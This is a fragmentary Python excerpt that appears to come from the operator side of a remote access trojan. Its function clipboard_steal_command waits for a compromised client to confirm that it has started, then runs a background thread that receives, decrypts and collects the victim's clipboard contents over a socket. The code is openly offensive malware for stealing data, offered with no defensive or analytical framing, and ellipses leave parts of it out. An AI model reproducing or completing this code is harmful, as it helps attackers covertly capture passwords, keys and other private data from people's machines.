...
import os
import threading
from components.logging import configure_logging, log_activity
import ascii_art
import subprocess
...
def clipboard_steal_command(client_output, conn_obj):
    """Interactively receive clipboard data from the client."""

    decrypted_client_message = decrypt_message(client_output)
    if not decrypted_client_message or decrypted_client_message.decode() != "STARTED":
        return colored(
            "[-] An error has occured when starting the clipboard steal function. Please try again in a few moments.",
            "red",
        )
    ...
    def listen_clipboard():
        ...
        while not stop_event.is_set():
            try:
                data = decrypt_message(conn_obj.recv(4096))
                if data:
    ...
    listener = threading.Thread(target=listen_clipboard, daemon=True)
    ...
    result = []
    for idx, entry in enumerate(received_data, 1):
        if entry:
